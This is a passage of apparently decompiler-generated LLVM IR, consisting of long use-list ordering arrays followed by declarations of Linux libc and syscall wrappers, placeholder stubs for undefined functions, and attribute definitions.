78, 910, 1612, 1613, 1614, 1615, 1616, 376, 911, 912, 913, 1617, 377, 1447, 1448, 1449, 1618, 1619, 1621, 1620, 1622, 281, 164, 163, 1623, 1624, 282, 1625, 914, 915, 1450, 1451, 916, 1626, 1627, 1628, 1629, 1630, 1631, 1632, 1633, 1634, 1635, 1636, 1062, 1063, 1372, 318, 917, 1060, 1061, 319, 918, 1439, 1067, 1068, 919, 283, 165, 1971, 1972, 378, 379, 1974, 1975, 320, 166, 872, 920, 921, 1980, 0, 1440, 881, 1441, 922, 284, 923, 1442, 1443, 1350, 1351, 1352, 1353, 1354, 1355, 1356, 1357, 1358, 285, 286, 1359, 924, 1360, 1637, 925, 1638, 1639, 321, 167, 168, 1640, 1641, 926, 1642, 1643, 1644, 380, 1645, 1646, 1647, 1648, 1649, 169, 1895, 170, 1896, 1897, 1898, 94, 130, 287, 140, 927, 32, 95, 33, 1302, 928, 131, 1650, 171, 1651, 34, 132, 123, 1652, 238, 172, 173, 1487, 96, 1452, 1453, 1485, 381, 1486, 1473, 1467, 1468, 1469, 1470, 1471, 1472, 929, 930, 1474, 1475, 1476, 1477, 1478, 1479, 1480, 1481, 1482, 1483, 1484, 931, 932, 1454, 1455, 1456, 1457, 1458, 1459, 1460, 1461, 1462, 1464, 1463, 239, 933, 1, 1465, 2, 1466, 1488, 1489, 1490, 1491, 1492, 1493, 1494, 1303, 1304, 1305, 1306, 1307, 934, 1308, 935, 936, 1653, 1654, 1655, 1656, 1657, 382, 1658, 1659, 1660, 1661, 1662, 1663, 1664, 1665, 1666, 1667, 1668, 1669, 1670, 1671, 1672, 1673, 175, 937, 1674, 1675, 1676, 1677, 1678, 176, 1679, 1680, 1681, 1682, 174, 1683, 35, 938, 383, 1684, 1685, 1686, 177, 1687, 939, 940, 941, 3, 288, 289, 1688, 1689, 1690, 178, 1691, 290, 355, 356, 1692, 1693, 1694, 1695, 1696, 1697, 942, 291, 1698, 124, 943, 1699, 179, 292, 293, 1700, 1701, 944, 1702, 1703, 1704, 945, 1705, 1706, 1707, 1708, 1709, 1710, 1496, 1497, 1498, 1499, 1500, 1501, 1502, 1503, 4, 1504, 1505, 946, 1506, 1507, 1508, 1509, 1510, 1511, 1512, 1513, 1514, 1515, 1516, 1517, 1518, 1519, 294, 1520, 180, 947, 948, 1521, 1981, 1982, 1983, 1984, 1985, 1986, 1987, 1988, 5, 240, 181, 1404, 1405, 1406, 1407, 6, 1408, 1409, 1410, 1411, 1412, 1413, 1414, 1415, 1416, 1417, 7, 1418, 1419, 949, 1420, 1421, 1711, 133, 1712, 950, 241, 951, 182, 1713, 183, 1714, 185, 184, 1361, 186, 187, 1362, 952, 1309, 134, 953, 1310, 1311, 1312, 1313, 1323, 1324, 1325, 1314, 1315, 1316, 1317, 1319, 1318, 1320, 1321, 1322, 1326, 1327, 954, 1328, 1329, 1330, 1331, 1332, 1333, 1334, 1335, 1336, 295, 1337, 1338, 1339, 955, 1340, 1341, 1342, 956, 1343, 1344, 1345, 1346, 1347, 1064, 1065, 957, 384, 1066, 188, 189, 1069, 958, 1075, 1076, 959, 1077, 960, 1070, 1071, 1072, 1073, 1074, 961, 1078, 1976, 1977, 1978, 1979, 1209, 1208, 1927, 1079, 1990, 1991, 1928, 8, 322, 962, 1992, 1210, 1211, 1233, 1212, 1213, 190, 1214, 191, 192, 1215, 9, 1216, 193, 231, 1217, 1218, 194, 296, 297, 385, 386, 1219, 1220, 1221, 1222, 1223, 195, 196, 1224, 10, 1225, 1226, 387, 1227, 1228, 1229, 1230, 1231, 1232, 197, 963, 1995, 1996, 298, 198, 1997, 11, 1998, 199, 232, 2021, 2022, 36, 964, 37, 148, 965, 2023, 966, 2039, 2047, 242, 2048, 388, 967, 2046, 2035, 2000, 2001, 2002, 200, 2003, 12, 13, 968, 299, 1999, 1905, 1989, 2034, 1915, 201, 1234, 969, 389, 970, 1235, 2024, 2025, 1117, 1118, 14, 1080, 1081, 1082, 1083, 1084, 971, 1085, 1086, 97, 98, 15, 1087, 1265, 1262, 1263, 1264, 243, 1266, 1267, 1268, 1269, 1270, 1272, 1271, 245, 1273, 1274, 1275, 1279, 1276, 1277, 1278, 244, 1280, 1281, 1282, 324, 323, 1283, 1284, 972, 1285, 1286, 390, 1288, 1287, 246, 1916, 882, 1917, 1993, 1994, 202, 1012, 1013, 99, 1014, 391, 392, 973, 1015, 878, 1046, 1047, 883, 393, 394, 1048, 974, 1049, 975, 1050, 873, 2004, 2005, 203, 976, 2020, 1422, 1423, 1424, 1425, 977, 1426, 1427, 1428, 300, 978, 1090, 1091, 1092, 204, 205, 979, 1088, 980, 1089, 206, 981, 207, 982, 1236, 100, 1237, 1238, 1239, 1240, 16, 983, 1093, 984, 301, 208, 395, 985, 209, 1931, 302, 1932, 1933, 1934, 1935, 303, 1936, 1937, 1938, 396, 1929, 397, 1930, 398, 210, 986, 987, 399, 988, 400, 142, 211, 989, 1939, 1940, 212, 213, 401, 80, 81, 1941, 143, 1942, 1943, 1944, 1945, 1946, 214, 215, 402, 141, 1947, 247, 1948, 126, 1949, 1950, 1952, 990, 1951, 17, 1094, 18, 1906, 1096, 1097, 1098, 874, 19, 1907, 1908, 1909, 1910, 1911, 1191, 1953, 1884, 1591, 1899, 1881, 216, 217, 991, 992, 2043, 38, 304, 1715, 1716, 403, 1717, 218, 993, 1718, 248, 404, 405, 135, 1891, 1892, 1719, 884, 101, 39, 144, 1954, 1955, 1973, 219, 1720, 1721, 1722, 1723, 1724, 1725, 1726, 1727, 1728, 1729, 1730, 1731, 220, 994, 221, 1732, 305, 1733, 1734, 1735, 1736, 1737, 40, 41, 995, 263, 264, 1738, 1739, 1740, 1741, 222, 1742, 1743, 1744, 996, 1745, 42, 43, 223, 997, 1746, 1747, 1748, 1751, 1749, 1750, 44, 82, 998, 1752, 1753, 1754, 1755, 357, 1756, 1757, 325, 999, 1758, 1759, 1760, 1761, 1762, 1763, 224, 1764, 1765, 1766, 1767, 1000, 1768, 1769, 249, 250, 1770, 1771, 1772, 1773, 1774, 1775, 1776, 1777, 1778, 1779, 1780, 1781, 1783, 1784, 1785, 1786, 1787, 1788, 1789, 1790, 1791, 1792, 1001, 1002, 1793, 1794, 1795, 1796, 1797, 1798, 1003, 1004, 1799, 1005, 1800, 1801, 1802, 1803, 1804, 1805, 1806, 1807, 1808, 1809, 1810, 1811, 1812, 1813, 1814, 1815, 1816, 1817, 1818, 1819, 1820, 1006, 1821, 1822, 1007, 1823, 1824, 1825, 1826, 1827, 1828, 1829, 1830, 1831, 1832, 1833, 1834, 1835, 306, 1008, 307, 1836, 1837, 1838, 1839, 1840, 1841, 1842, 1843, 1844, 1845, 1846, 1847, 1848, 308, 1849, 1850, 1851, 1852, 1853, 45, 1854, 1855, 46, 102, 103, 104, 105, 1856, 1857, 1858, 1859, 1860, 1861, 225, 1862, 226, 1009, 1863, 1864, 1865, 1866, 875, 1867, 1868, 1869, 1870, 1871, 1872, 227, 1010, 127, 79, 121, 228, 1782, 251, 1873, 1874, 1875, 1876, 1877, 1878, 1879, 1880, 2006, 2007, 253, 2013, 2008, 2009, 2010, 2011, 2012, 1011, 252, 2014, 2015, 2016, 2017, 2018, 2019, 2044, 2045, 406, 1207, 2031, 2032, 2033, 145, 146, 147, 1099, 1886, 1885, 1100, 1918, 1119, 2040, 2041, 2042, 1919, 1920, 1921, 1101, 1111, 2026, 2027, 2028, 2029, 2030, 2036, 2037, 2038, 1095, 233, 410, 411, 234, 412, 1102, 409, 106, 28, 29, 413, 1103, 1104, 414, 421, 422, 486, 487, 47, 309, 407, 885, 1105, 310, 408, 1106, 415, 1107, 416, 311, 1108, 417, 418, 419, 423, 424, 1109, 1110, 420, 426, 427, 425, 265, 266, 267, 108, 1113, 428, 1112, 431, 432, 107, 429, 430, 1114, 1115, 358, 1116, 433, 136, 446, 1120, 312, 48, 49, 1121, 1122, 443, 1123, 1125, 444, 445, 1124, 257, 1126, 359, 1127, 1128, 1129, 1130, 1131, 440, 1132, 1134, 441, 442, 1133, 256, 1135, 1136, 437, 1137, 1139, 438, 439, 1138, 255, 1140, 1141, 434, 1142, 1144, 435, 436, 1143, 254, 1145, 1146, 1147, 1148, 1149, 1150, 1151, 1152, 447, 229, 1153, 1154, 1155, 1156, 1157, 1158, 1159, 448, 1160, 1161, 449, 1162, 1163, 450, 451, 1164, 452, 453, 1165, 454, 455, 1166, 456, 457, 1167, 465, 466, 458, 459, 1168, 1169, 1170, 1171, 1172, 1173, 50, 326, 1174, 1181, 1175, 1176, 1177, 1178, 1179, 1180, 258, 1182, 1183, 360, 1184, 1185, 1186, 1187, 460, 1188, 313, 1189, 1190, 137, 1192, 1193, 51, 329, 1194, 361, 1195, 1196, 1197, 886, 1198, 461, 1199, 327, 52, 328, 462, 1200, 1201, 314, 1202, 1203, 268, 269, 464, 330, 463, 53, 1204, 1205, 54, 83, 270, 271, 272, 1206, 467, 315, 1016, 1017, 1018, 1019, 1020, 1021, 1022, 1023, 1024, 1025, 1026, 1027, 1028, 1029, 1030, 1031, 1032, 1033, 1034, 1035, 1036, 1037, 1038, 1039, 876, 331, 1040, 1041, 1042, 1043, 1044, 1045, 1241, 1242, 111, 20, 1243, 109, 110, 1244, 468, 332, 27, 55, 56, 1245, 57, 84, 1246, 333, 362, 469, 470, 471, 334, 877, 1247, 472, 473, 1248, 1249, 1250, 1251, 116, 1252, 1253, 1254, 58, 112, 113, 114, 115, 1255, 59, 60, 61, 62, 63, 21, 22, 23, 24, 1256, 1258, 1259, 1260, 476, 1261, 474, 335, 475, 336, 1257, 363, 477, 478, 316, 337, 25, 317, 887, 479, 1289, 273, 274, 275, 276, 480, 1290, 338, 481, 340, 1291, 339, 1292, 482, 277, 1882, 483, 484, 1883, 1887, 1888, 1889, 888, 343, 342, 341, 346, 344, 345, 485, 117, 64, 85, 65, 1890, 488, 66, 118, 489, 490, 1894, 491, 1893, 493, 494, 119, 492, 1900, 1901, 364, 1902, 1903, 138, 1904, 67, 365, 120, 889, 1912, 495, 496, 497, 1913, 1914, 499, 498, 1922, 1923, 500, 1924, 1925, 1926, 501, 68, 502, 503, 504, 505, 506, 1965, 69, 70, 122, 71, 349, 350, 1956, 1957, 1958, 1959, 259, 347, 348, 351, 1960, 1961, 1962, 1963, 72, 73, 74, 1964, 366, 75, 76, 1966, 1967, 352, 26, 1968, 1969, 1970, 230, 1051, 260, 507, 508, 509, 510, 511, 512, 513, 514, 515, 516, 517, 518, 519, 520, 521, 522, 523, 524, 525, 526, 527, 528, 529, 530, 531, 532, 533, 534, 535, 536, 537, 538, 539, 540, 541, 542, 543, 544, 545, 546, 547, 548, 549, 550, 551, 552, 553, 554, 555, 556, 557, 558, 559, 560, 561, 562, 563, 564, 565, 566, 567, 568, 569, 570, 571, 572, 573, 574, 575, 576, 577, 578, 579, 580, 581, 582, 583, 584, 585, 586, 587, 588, 589, 590, 591, 592, 593, 594, 595, 596, 597, 598, 599, 600, 601, 602, 603, 604, 605, 606, 607, 608, 609, 610, 611, 612, 613, 614, 615, 616, 617, 618, 619, 620, 621, 622, 623, 624, 625, 626, 627, 628, 629, 630, 631, 632, 633, 634, 635, 636, 637, 638, 639, 640, 641, 642, 643, 644, 645, 646, 647, 648, 649, 650, 651, 652, 653, 654, 655, 656, 657, 658, 659, 660, 661, 662, 663, 664, 665, 666, 667, 668, 669, 670, 671, 672, 673, 674, 675, 676, 677, 678, 679, 680, 681, 682, 683, 684, 685, 686, 687, 688, 689, 690, 691, 692, 693, 694, 695, 696, 697, 698, 699, 700, 701, 702, 703, 704, 705, 706, 707, 708, 709, 710, 711, 712, 713, 714, 715, 716, 717, 718, 719, 720, 721, 722, 723, 724, 725, 726, 727, 728, 729, 730, 731, 732, 733, 734, 735, 736, 737, 738, 739, 740, 741, 742, 743, 744, 745, 746, 747, 748, 749, 750, 751, 752, 753, 754, 755, 756, 757, 758, 759, 760, 761, 762, 763, 764, 765, 766, 767, 768, 769, 770, 771, 772, 773, 774, 775, 776, 777, 778, 779, 780, 781, 782, 783, 784, 785, 786, 787, 788, 789, 790, 791, 792, 793, 794, 795, 796, 797, 798, 799, 800, 801, 802, 803, 804, 805, 806, 807, 808, 809, 810, 811, 812, 813, 814, 815, 816, 817, 818, 819, 820, 821, 822, 823, 824, 825, 826, 827, 828, 829, 830, 831, 832, 833, 834, 835, 836, 837, 838, 839, 840, 841, 842, 843, 844, 845, 846, 847, 848, 849, 850, 851, 852, 853, 854, 855, 856, 857, 858, 859, 860, 861, 862, 863, 864, 865, 866, 867, 868, 869, 870, 2049, 2050, 2051, 2052, 2053, 2054, 2055, 2056 }
  uselistorder i32* @ebx, { 94, 286, 290, 291, 292, 293, 331, 339, 340, 341, 342, 343, 344, 345, 346, 347, 348, 349, 350, 351, 352, 355, 356, 357, 358, 359, 360, 361, 364, 365, 366, 362, 363, 367, 368, 369, 370, 371, 372, 373, 374, 375, 376, 377, 378, 379, 380, 381, 382, 399, 400, 401, 402, 403, 422, 423, 424, 427, 428, 425, 426, 515, 516, 37, 517, 518, 519, 36, 520, 2, 521, 522, 523, 524, 525, 530, 531, 532, 533, 534, 535, 536, 537, 538, 539, 95, 96, 97, 98, 100, 99, 540, 3, 4, 542, 541, 5, 8, 544, 543, 102, 103, 545, 546, 547, 548, 549, 429, 9, 430, 431, 432, 10, 433, 434, 435, 436, 437, 438, 439, 550, 551, 440, 441, 552, 553, 554, 555, 556, 557, 558, 559, 560, 561, 562, 563, 564, 565, 566, 567, 568, 569, 570, 571, 11, 572, 573, 106, 107, 108, 109, 110, 111, 112, 353, 354, 101, 404, 405, 125, 126, 127, 128, 129, 104, 105, 749, 750, 754, 755, 406, 407, 408, 409, 410, 411, 412, 413, 414, 415, 416, 417, 418, 419, 420, 421, 332, 333, 334, 335, 574, 575, 576, 577, 38, 578, 579, 580, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 294, 295, 296, 297, 442, 443, 444, 445, 446, 473, 474, 475, 476, 477, 447, 448, 449, 450, 12, 470, 13, 471, 472, 451, 452, 465, 454, 455, 456, 457, 458, 459, 460, 461, 462, 463, 464, 466, 467, 468, 469, 33, 453, 478, 479, 480, 481, 482, 483, 484, 485, 486, 487, 488, 298, 299, 300, 301, 302, 303, 304, 305, 306, 14, 307, 15, 308, 309, 581, 582, 583, 584, 16, 585, 586, 587, 17, 588, 18, 589, 590, 591, 592, 489, 490, 491, 492, 493, 494, 495, 496, 497, 498, 499, 500, 501, 502, 19, 503, 504, 505, 506, 507, 508, 509, 510, 511, 512, 513, 514, 383, 384, 385, 386, 387, 388, 389, 390, 20, 391, 392, 393, 394, 395, 396, 336, 337, 338, 287, 288, 289, 310, 311, 312, 313, 0, 314, 315, 317, 318, 316, 319, 320, 321, 322, 323, 6, 324, 325, 326, 21, 327, 328, 329, 330, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 130, 136, 137, 138, 139, 131, 132, 133, 134, 135, 140, 141, 751, 22, 752, 753, 224, 225, 226, 227, 230, 231, 232, 228, 229, 707, 708, 709, 710, 711, 758, 41, 42, 233, 234, 243, 235, 236, 237, 238, 239, 240, 241, 242, 761, 762, 772, 773, 774, 791, 792, 793, 794, 775, 781, 789, 790, 763, 795, 796, 797, 798, 759, 760, 694, 695, 756, 757, 779, 780, 698, 699, 244, 245, 246, 247, 248, 249, 776, 777, 142, 143, 144, 145, 146, 147, 148, 149, 280, 23, 281, 282, 34, 43, 24, 44, 712, 83, 84, 85, 86, 87, 88, 89, 764, 765, 771, 397, 398, 155, 156, 150, 151, 152, 153, 250, 251, 252, 7, 253, 267, 268, 254, 255, 256, 154, 157, 158, 269, 270, 271, 159, 160, 161, 162, 713, 716, 717, 718, 25, 714, 715, 719, 720, 721, 722, 723, 724, 725, 726, 727, 39, 728, 729, 730, 731, 732, 26, 733, 734, 735, 736, 737, 738, 739, 740, 696, 697, 163, 164, 165, 209, 210, 211, 212, 741, 742, 743, 744, 671, 672, 673, 674, 526, 527, 528, 529, 666, 667, 668, 669, 670, 263, 264, 593, 27, 594, 595, 596, 597, 688, 689, 598, 599, 600, 601, 602, 603, 604, 605, 28, 606, 607, 608, 609, 610, 611, 612, 613, 614, 615, 616, 617, 618, 619, 620, 1, 621, 622, 623, 624, 625, 626, 627, 628, 629, 635, 636, 637, 638, 639, 640, 641, 642, 643, 644, 645, 646, 647, 648, 649, 650, 651, 29, 652, 653, 654, 655, 656, 657, 90, 91, 92, 93, 630, 632, 631, 633, 634, 658, 659, 660, 661, 662, 30, 663, 664, 665, 766, 31, 767, 768, 769, 40, 32, 35, 770, 808, 809, 810, 811, 218, 219, 220, 257, 258, 675, 676, 677, 678, 681, 682, 683, 679, 680, 166, 167, 168, 700, 701, 186, 187, 799, 800, 801, 802, 803, 804, 805, 806, 807, 702, 703, 704, 705, 706, 169, 170, 171, 183, 184, 185, 778, 782, 783, 784, 785, 786, 787, 788, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 188, 189, 190, 191, 192, 193, 194, 195, 206, 207, 208, 213, 214, 215, 216, 217, 221, 222, 223, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 259, 260, 261, 262, 265, 266, 272, 273, 274, 275, 276, 277, 278, 279, 283, 284, 285, 684, 685, 686, 687, 690, 691, 692, 693, 745, 746, 747, 748 }
}

; Function Attrs: nounwind readnone
declare i32 @llvm.ctlz.i32(i32, i1) #0

; Function Attrs: nounwind readnone
declare i32 @llvm.bswap.i32(i32) #0

declare i8* @_memset(i8*, i32, i32) local_unnamed_addr

declare i8* @_memcpy(i8*, i8*, i32) local_unnamed_addr

declare i32 @_strlen(i8*) local_unnamed_addr

; Function Attrs: nounwind readnone
declare i16 @llvm.bswap.i16(i16) #0

declare i32 @__libc_errno(i32) local_unnamed_addr

declare i32 @int80_syscall(i32) local_unnamed_addr

declare i32 @fcntl(i32, i32, ...) local_unnamed_addr

declare void @exit(i32) local_unnamed_addr

declare i32 @pipe([2 x i32]) local_unnamed_addr

declare i32 @setsid() local_unnamed_addr

declare i32 @sigprocmask(i32, %_TYPEDEF_sigset_t*, %_TYPEDEF_sigset_t*) local_unnamed_addr

declare i32 @time(i32*) local_unnamed_addr

declare i32 @clock_getres(i32, %timespec*) local_unnamed_addr

declare i32 @vfork() local_unnamed_addr

declare i32 @clone(i32 (i32*)*, i32*, i32, i32*, ...) local_unnamed_addr

declare i32 @getpid() local_unnamed_addr

declare i32 @close(i32) local_unnamed_addr

declare i32 @open(i8*, i32, ...) local_unnamed_addr

declare i32 @write(i32, i32*, i32) local_unnamed_addr

declare i32 @read(i32, i32*, i32) local_unnamed_addr

declare i32 @waitpid(i32, i32*, i32) local_unnamed_addr

declare i32 @sigreturn(%sigcontext*) local_unnamed_addr

declare i32 @sigaction(i32, %sigaction*, %sigaction*) local_unnamed_addr

declare i32 @execve(i8*, [1 x i8*], [1 x i8*]) local_unnamed_addr

declare i32 @nanosleep(%timespec*, %timespec*) local_unnamed_addr

declare i32 @brk(i32*) local_unnamed_addr

declare i32 @fstat64(i32, %stat64*) local_unnamed_addr

declare i32 @getdents64(i32, %linux_dirent64*, i32) local_unnamed_addr

declare i32 @poll(%pollfd*, i32, i32) local_unnamed_addr

declare i32 @stat64(i8*, %stat64*) local_unnamed_addr

declare i32 @__decompiler_undefined_function_0() local_unnamed_addr

declare i64 @__decompiler_undefined_function_1() local_unnamed_addr

declare i8* @__decompiler_undefined_function_2() local_unnamed_addr

declare i8 @__decompiler_undefined_function_3() local_unnamed_addr

declare i16 @__decompiler_undefined_function_4() local_unnamed_addr

declare i16* @__decompiler_undefined_function_5() local_unnamed_addr

declare i8** @__decompiler_undefined_function_6() local_unnamed_addr

declare %_TYPEDEF_sigset_t* @__decompiler_undefined_function_7() local_unnamed_addr

declare %sigaction* @__decompiler_undefined_function_8() local_unnamed_addr

declare x86_fp80 @__decompiler_undefined_function_9() local_unnamed_addr

; Function Attrs: noreturn nounwind
declare void @llvm.trap() #1

attributes #0 = { nounwind readnone }
attributes #1 = { noreturn nounwind }
